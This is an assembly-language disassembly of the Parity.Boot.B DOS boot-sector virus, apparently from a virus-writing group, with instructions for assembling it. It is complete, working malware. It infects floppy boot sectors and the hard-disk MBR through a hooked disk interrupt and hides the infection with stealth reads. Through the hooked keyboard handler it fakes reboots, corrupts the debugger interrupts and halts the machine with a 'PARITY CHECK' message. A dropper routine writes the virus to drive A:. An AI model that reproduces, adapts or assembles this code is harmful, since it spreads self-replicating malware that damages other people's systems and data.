;==============================================================================
;                                                                      25.12.98
;        ***   PARITY.BOOT.B disassembly by Evil-E [Codebreakers]   ***
;==============================================================================
; Type           : Boot/MBR resident, stealth
; Size           : 512 Bytes
; characteristic : coventional memory size decreased by 1 Kb
;                  Messages randomly "PARITY CHECK"
;                  CTRL-ALT-DEL calls a pseudeo reboot
;                  Debuggers don´t work proper
; hooked Ints    : 09h (Keyboard) is set to offset 7D62h
;                  13h (Disk) is set to offest 7C82h
;                  segments of 01h(single step) and 03h (breakpoint) 
;                  are destroyed
; Origin         : germany
; Discovered     : late 1992
;
; Compiling instructions
; Tasm  pbb.asm /m3
; Tlink pbb /m3
;==============================================================================
.8086
MODEL TINY
CODESEG

Org 0h
 jmp             short start
 nop
 OEM_Name        db 'MSDOS5.0'             ; OEM name and version
 Bytes_sec       dw 0200h                  ; bytes per sector
 Sec_Cluster     db 01h                    ; sectors per cluster
 Reser_Sec       dw 0001h                  ; number of reserved sectors
 Fats            db 02h                    ; number of FAT's on disk
 Root_Entries    dw 000e0h                 ; number of root directory entries
 total_Sec       dw 00b40h                 ; number of total sectors
 Media_Descrip   db 0f0h                   ; media descriptor byte
 Sectors_FAT     dw 00009h                 ; sectors per FAT
 sec_Track       dw 0012h                  ; sectors per track
 Heads           dw 0002h                  ; number of heads 
 Hidden_Sec      Dd 00000000               ; number of hidden sectors
 NSec            dd 00                     ; (DOS 4+) number of sectors
 Drive           Db 00                     ; (DOS 4+) physical drive number
 reserved        db 00h                    ; (DOS 4+) reserved
 Signature       Db 029h                   ; (DOS 4+) signature byte (29h)
 Serial_Number   DD 1f6d10e4h              ; (DOS 4+) volume serial number
 Volume_Label    Db 'PARITYBOOTBFAT12   '

start:
  cli
  push   cs                  ; CS=0 on startup
  pop    ds
  mov    ax,word ptr ds:[004Ch]              ; get old int 13h
  mov    word ptr ds:[oldint13+07C00h],ax    ; save
  mov    ax,word ptr ds:[004Eh]
  mov    word ptr ds:[oldint13+2+07C00h],ax

  mov    al,byte ptr ds:[046Eh]              ; clock tick HiByte (hours)
  mov    byte ptr ds:[counter+07C00h],al 
  mov    ax,word ptr ds:[0413h]              ; memsize in Kb
  dec    ax                                  ; -1 KB
  mov    word ptr ds:[0413h],ax
  mov    cl,06
  shl    ax,cl
  sub    ax,07C0h
  mov    word ptr ds:[004Eh],ax              ; set new Int 13h (Disk) hi
  mov    word ptr ds:[0026h],ax              ; set new Int 09h (Keyboard) hi
  mov    word ptr word ptr ds:[004Ch],offset int13+7C00h
  mov    word ptr ds:[0024h],offset keyboard+7C00h
  mov    si,7C00h
  mov    di,si
  mov    es,ax
  mov    cx,0100h
  cld
  rep movsw                                  ; copy to TOM
  int    19h                                 ; reboot system

;==============================================================================

Int13:
  cmp    ah,0AAh
  jne    no_check
  iret
no_check:
  cmp    ah,02h                              ; read ?
  jne    Exit_Int13
  cmp    cx,0001h                            ; track 0 sector 1 ?
  jne    Exit_Int13
  cmp    dh,00h                              ; head 0
  jne    Exit_Int13
  push   ax
  push   bx
  push   si
  push   di
  pushf
  call   dword ptr cs:[oldint13+07C00h]      ; read bootsector
  jnb    no_Error
  jmp    Error
no_Error:
  cmp    word ptr es:[bx+Boot_signature],0AA55h     ; is it a boot_sector ?
  je     Boot_Signature_ok
  jmp    exit
Boot_Signature_ok:
  cmp     byte ptr es:[bx+infection_signature],0C9h ; already infected ?
  je     stealth                                    ; yep -> stealth
  call   Find_MBR                                   ; find new place for org. bootsector
  call   write_MBR                                  ; write org. bootsector to new place
  mov    si,bx
  cmp    dl,079h                                    ; HD ?
  ja     PartitionsCopy
  add    si,0002h                                   ; else copy boot record
  mov    di,7C02h
  mov    cx,001Eh
  xor    dh,dh
  jmp    Copy

Exit_int13:
  Db 0EAh
  oldint13 dd 0  ; Jmp Far to the orginal INT 13 Handler

Exit:
  mov    ax,0001h
  clc
Error:
  pop    di
  pop    si
  pop    bx
  inc    sp
  inc    sp
  retf   0002h

PartitionsCopy:
  add    si,offset Partitions_Table
  mov    di,offset Partitions_Table+07C00h
  mov    cx,0020h
  jmp    Copy

Write_MBR:
  mov    ax,0301h                         ; write sector
  pushf
  call   dword ptr cs:[oldint13+07C00h]
  jnb    no_error1
  pop    bx
  mov    cl,01h
  xor    dh,dh
  jmp    Exit

no_error1:
  ret

Copy:
  push   ds         ; copy boot record or  the partition table
  push   es         ; of the org. boot sector/MBR in virii code
  pop    ds
  push   cs
  pop    es
  cld
  rep movsw

retry:
  mov    cx,0001h               ;track 0, sector 1
  mov    bx,7C00h
  mov    ax,0301h                           ;write 1 sector
  pushf
  call   dword ptr cs:[oldint13+07C00h]     ; write virii
  jb     retry
  push   ds
  pop    es
  inc    byte ptr cs:[counter+07C00h]       ; inc infection counter :)
  pop    ds
  jmp    exit

  ; this is the message (PARITY CHECK) XOR 55H
  message db 005h,014h,007h,01Ch
          db 001h,00Ch,075h,016h
          db 01Dh,010h,016h,01Eh
          db 0FFh


stealth:
  call  Find_MBR                         ; find place where org. boot is stored
  pop    di
  pop    si
  pop    bx
  pop    ax
  pushf
  call   dword ptr cs:[oldint13+07C00h]  ; read
  xor    dh,dh
  mov    cl,01h
  retf   0002

find_MBR:
    cmp     dl,79h                   ; >79 means HD
    ja      Harddisk
    mov     ax,es:[bx+16h]           ; Sectors/FAT
    mov     dh,1
    cmp     al,3                     ; 720Kb disc
    jnb     HD_Disk
    mov     cl,3                     ; head 1, track 0, sector 3
    ret
HD_Disk:
    cmp     al,7
    jnb     Harddisk
    mov     cl,05                    ; 360Kb disc
    ret
Harddisk:
    mov     cl,0Eh                   ; HD or 1,44Mb disc
    ret

KeyBoard:
  push   ax
  push   ds
  xor    ax,ax
  mov    ds,ax
  mov    al,byte ptr ds:[0417h]          ; keyboard shift status
  and    al,0Ch                          ; CTRL+ALT pressed?
  cmp    al,0Ch
  jne    no_reboot
  in     al,60h                          ; get scancode
  cmp    al,53h                          ; and DEL pressed ?
  jne    no_reboot
  in     al,61h                          ; complete the keyb I/O
  push   ax                              ; by handshaking the
  or     al,80h                          ; control reg.
  out    61h,al
  pop    ax
  out    61h,al
  mov    ax,0002h                        ; set video mode 80x25x16
  int    10h
  mov    al,20h                          ; EOI
  out    20h,al
  int    19h                             ; Reboot system

no_reboot:
  mov    al,byte ptr ds:[046Eh]          ; clock tick hi
  mov    word ptr ds:[0006h],ax          ; destroy INT 1 hi
  mov    word ptr ds:[000Eh],ax          ; destroy INT 3 hi
  push   cs
  pop    ds
  cmp    al,byte ptr ds:[counter+07C00h] ; akt. hour = infections+start hour
  jbe    _2
  xor    ax,ax                           ; set video mode 40x25x16
  int    10h
  mov    si,offset message+07C00h
next:
  mov    ah,14                           ; display "PARITY CHECK"
  xor    bx,bx
  cld
  lodsb
  cmp    al,0FFh
  je     halt
  xor    al,55h
  int    10h
  jmp    next
halt:
  hlt                                    ; halt CPU
_2:
  pop    ds
  pop    ax
  db 0EAh,087h,0E9h,000h,0F0h ;jmp far F000h:E987h (org. Bios Keyboard Handler)
  
infection_signature DB 0C9h
counter             DB 14
Partitions_Table Db 40h Dup(90h)
Boot_Signature   Db 055h,0AAh
;===============================================================

DROPPER:
 push    cs
 push    cs

 pop     ds
 POP     es

 mov     bp,8

Try_Again:      
  dec     bp
  jz      exit_dropper
  mov     ah,09h
  mov     dx, offset inser_msg
  int     21h
  xor     ax,ax                  ; Reset drive A:
  xor     dx,dx
  INT     13h

  mov     ax, 0301h               ; Overwrite bootsector with
  xor     bx,bx                  ; our virus.
  mov     cx, 01h
  int     13h
  jc      Try_Again

  mov     ah, 09h                 ; Display message.
  mov     dx, OFFSET Warning_Msg
  int     21h
Exit_dropper:
  mov     ax, 4C00h               ; Exit to DOS
  int     21h

Inser_Msg       DB      'Please inser a Disk into drive A:'
                DB      0Ah, 0Dh, '$'
Warning_Msg     DB      'WARNING: Disk in drive A: is infected with Parity.Boot.B !'
                DB      0Ah, 0Dh, '$'
END DROPPER
